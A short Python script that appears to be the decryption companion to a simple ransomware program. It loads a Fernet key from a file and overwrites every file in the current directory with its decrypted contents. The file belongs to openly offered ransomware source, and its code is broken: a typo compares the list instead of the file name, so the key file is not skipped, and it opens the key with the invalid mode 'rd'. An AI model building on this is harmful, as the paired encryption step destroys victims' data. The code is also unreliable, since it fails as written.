import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
    if file=="simple_Ransomware.py" or files=="the_key.key":
        continue
    files.append(file)

print(files)
with open("the_key.key","rd") as thekey:
    key=thekey.read()


for file in files:
    with open(file,"rb") as thefile:
        content=thefile.read()
    content_decrypted= Fernet(key).decrypt(content)
    with open(file,"wb") as thefile:
        thefile.write(content_decrypted)
